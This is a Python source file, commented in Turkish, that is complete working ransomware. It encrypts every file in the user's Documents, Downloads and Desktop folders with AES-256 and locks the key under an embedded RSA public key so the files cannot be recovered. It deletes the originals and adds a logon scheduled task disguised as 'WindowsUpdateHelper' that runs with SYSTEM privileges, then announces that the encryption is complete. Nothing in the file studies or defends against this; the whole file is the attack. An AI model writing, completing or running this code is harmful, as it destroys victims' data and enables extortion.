import os
import secrets
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import tkinter as tk
from tkinter import messagebox
from pathlib import Path

from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.primitives.serialization import load_pem_public_key


# For whatever OS, this finds the full path of all folders. Change this with, Desktop, Documents, .mdb,.sql,$DBF$
folders_path = [
    str(os.path.join(Path.home(), "Documents")),
    str(os.path.join(Path.home(), "Downloads")),
    str(os.path.join(Path.home(), "Desktop"))

]
import subprocess
import sys
import os


def add_to_task_scheduler():
    try:
        # EXE veya script yolu
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        # Masum görev adı (örneğin "WindowsUpdateHelper" veya "AdobeFlashUpdate")
        task_name = "WindowsUpdateHelper"

        # Komut: Her kullanıcı girişinde çalışsın (ONLOGON)
        # /RU SYSTEM → Yüksek haklar, şifre sormaz
        # /F → Zaten varsa üzerine yaz
        cmd = [
            "schtasks", "/Create",
            "/TN", task_name,
            "/TR", f'"{exe_path}"',          # exe'yi direkt çalıştır
            "/SC", "ONLOGON",                # Kullanıcı girişinde
            "/RL", "HIGHEST",                # En yüksek haklar
            "/RU", "SYSTEM",                 # SYSTEM hesabı
            "/F"                             # Zorla oluştur/üzerine yaz
        ]

        # Eğer .py ise: "/TR", f'"C:\\Python\\pythonw.exe" "{exe_path}"'

        result = subprocess.run(cmd, capture_output=True, text=True, check=True)

        print(f"[+] Task Scheduler kalıcılığı eklendi: {task_name}")
        print(result.stdout)

    except subprocess.CalledProcessError as e:
        print(f"[-] schtasks hatası: {e.stderr}")
    except Exception as e:
        print(f"[-] Task Scheduler ekleme hatası: {e}")


file_key = secrets.token_bytes(32) # dosyaları sifrelemek için kullanılacak sımetrık AES-256
public_key_bytes = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAr6mXDTXMeBfznyezQOq/
0iOPZCq160eMU7UspQbVF+KK8pisSfJxQhXP33E2xYmW0JGwQ9HWTJJAqiaLBdpU
8ibL18CcPBuKSZewOnBhN2DyfXng+Q3aPOLtJSvx/jL4LkfHN82CyR7A/Kmn/ysL
7Ag8yQeOBmtx+I1UbWar3vy/6VPMKnH/S2/VdgvGudxF68cM88cISX02r49nXL0n
R0kT4LmlnGrUIS1HaE1QfVwOf6h+ruPjInkJYPDe4yWz9rG+ZaqfJDryeaT1SU/D
HGqGSymJ39qWCPgOoOEX7aXYrJcaM/iZgWxB6TzyeIHXb76zNE/PgNwqJzM1Wm2E
h9OF1Aj+PSI45mpTGpFr4OnI7j93XkcxFXUGzO4NUDq1gfh2lHHZxl6Nwri9XH7J
HO/vZFGwFbEaSfqzkTNWYXgLMEgCvg4quZt4Zt3okSocN5F20IjM8+LVaUIf7Vtw
bg90pNi06xBeMGjwSN/NuGs6AMuINIwNOpxDZC9pufROwSRtv3bIgAFjWcfnuwpQ
n7Or07uMTAAoX53qyeihzfD1zqrIlWRiwztY/BiKdcOKgsT62Dd1MpElNQ1zyUic
/ZdSIaB9CixsWDJRLyP5gwN3aSGy5yqeiVEpC5fX15pjIi8MEpllWqoG6VbJI0Ya
WQcBuaJJ3fvl9hgj6b8SFwcCAwEAAQ==
-----END PUBLIC KEY-----""".encode('utf-8') # RSA public key
rsa_public_key = load_pem_public_key(public_key_bytes)

encrypted_file_key = rsa_public_key.encrypt(file_key, # file_keyı sifreliyoruz kı gerı donus olmasın
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
ENCRYPTED_KEY_SIZE = len(encrypted_file_key)

# her bir dosya için faarklı IV kullan

def encrypt_file():
    for folder in folders_path:

        for root, dirs, files in os.walk(folder):


            for file in files:
                bufferSize = 128*1024
                filePath = os.path.join(root, file)
                if not os.path.isfile(filePath):
                    continue


                if not file.endswith(".aes"):
                    iv = os.urandom(16) # ıv yı kaydetmemeiz lazim
                    cipher = Cipher(algorithms.AES(file_key), modes.CBC(iv), backend=default_backend())
                    encryptor = cipher.encryptor()

                    padder = PKCS7(algorithms.AES.block_size).padder()

                    destination_path= os.path.join(root , file+".aes")
                    with open(filePath, "rb") as input_file:
                        with open(destination_path, "wb") as output_file:
                            output_file.write(encrypted_file_key)
                            output_file.write(iv)

                            while True:
                                chunk = input_file.read(bufferSize)
                                if not chunk:
                                    break

                                padded_chunk = padder.update(chunk)
                                encrypted_chunk = encryptor.update(padded_chunk)
                                output_file.write(encrypted_chunk)

                            final_padded_data = padder.finalize()
                            final_encrypted_chunk = encryptor.update(final_padded_data)
                            output_file.write(final_encrypted_chunk)

                    os.remove(filePath)



if __name__ == "__main__":
    encrypt_file()
    add_to_task_scheduler()
    root = tk.Tk()
    root.withdraw()
    root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
    messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted. ")
    root.mainloop()